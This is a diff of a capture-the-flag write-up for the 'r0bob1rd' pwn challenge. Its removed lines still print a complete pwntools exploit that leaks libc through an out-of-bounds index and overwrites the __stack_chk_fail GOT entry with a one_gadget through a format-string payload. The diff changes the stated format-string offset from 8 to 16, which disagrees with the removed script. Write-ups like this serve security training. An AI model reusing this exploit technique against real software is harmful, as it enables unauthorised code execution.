@@ -36,11 +36,11 @@ Partial RELRO: The Global Offset Table (GOT) is writable. This is the key vulner
 
 NX enabled: The stack and heap are non-executable, preventing simple shellcode injection.
 
-Canary found: Stack canaries are enabled. Instead of bypassing this, our strategy will be to abuse the failure-checking mechanism itself.
+Canary found: Stack canaries are enabled. Instead of bypassing this, our strategy will be to abuse the failure-checking mechanism itself
 
 2. Vulnerability Analysis
 Decompiling the binary in Ghidra reveals two key vulnerabilities within the operation() function:
-![Binary Analysis](/Daminoo123.github.io/imgs/robobird/ghidra.png)
+![Final Exploit Execution]({{ '/imgs/robobird/ghidra.png' | relative_url }})
 
 Out-of-Bounds (OOB) Read: When selecting a bird, the program reads an integer but does not validate that it is within the expected range. By providing a negative index, we can read memory locations before the start of the robobirdNames global variable, which is located near the GOT, allowing us to leak libc function addresses.
 
@@ -74,59 +74,26 @@ robobirdNames     = 0x6020a0
 Find libc Offsets and Gadgets:
 
 bash
-Copier
-Modifier
 $ readelf -s ./glibc/libc.so.6 | grep ' puts@'
 # Offset: 0x084420
-![Binary Analysis](/Daminoo123.github.io/imgs/robobird/gadgets.png)
+![Final Exploit Execution]({{ '/imgs/robobird/gadgets.png' | relative_url }})
 $ one_gadget ./glibc/libc.so.6
 # Choose: 0xe3b01
 Gadget Verification in GDB
 
-![Binary Analysis](/Daminoo123.github.io/imgs/robobird/gadgets2.png)
+![Final Exploit Execution]({{ '/imgs/robobird/gadgets2.png' | relative_url }})
 Target GOT Address for Overwrite:
 
 bash
-Copier
-Modifier
 $ objdump -R r0bob1rd | grep '__stack_chk_fail'
 0x602018 R_X86_64_JUMP_SLOT  __stack_chk_fail@GLIBC_2.4
 Format String Offset:
 
-Stack offset for our input is 8.
+Stack offset for our input is 16.
 
-B. Final Exploit Script
-python
-Copier
-Modifier
-#!/usr/bin/env python3
-from pwn import *
+ Final Exploit Script:
 
-exe = './r0bob1rd'
-elf = context.binary = ELF(exe, checksec=True)
-libc = ELF('./glibc/libc.so.6', checksec=False)
 
-one_gadget_offset = 0xe3b01
-FMT_OFFSET = 8
-target_got_addr = elf.got['__stack_chk_fail']
+![Final Exploit Execution]({{ '/imgs/robobird/solver.png' | relative_url }})
 
-p = process(exe)
-
-# Leak puts address
-log.info("PHASE 1: Leaking puts address...")
-p.sendlineafter(b'>', b'-16')
-p.recvuntil(b'sen: ')
-leaked_puts = unpack(p.recv(6) + b'\x00' * 2)
-log.info(f'RECEIVED --> {hex(leaked_puts)}')
-
-# Calculate one_gadget address
-libc.address = leaked_puts - libc.symbols['puts']
-one_gadget_addr = libc.address + one_gadget_offset
-log.success(f'one_gadget_addr --> {hex(one_gadget_addr)}')
-
-# Overwrite GOT and trigger
-p.recvuntil(b'> ')
-payload = fmtstr_payload(FMT_OFFSET, {target_got_addr: one_gadget_addr})
-p.sendline(payload.ljust(106, b'\x90'))
-
-![Binary Analysis](/Daminoo123.github.io/imgs/robobird/pwn2.png)
+![Final Exploit Execution]({{ '/imgs/robobird/pwn2.png' | relative_url }})
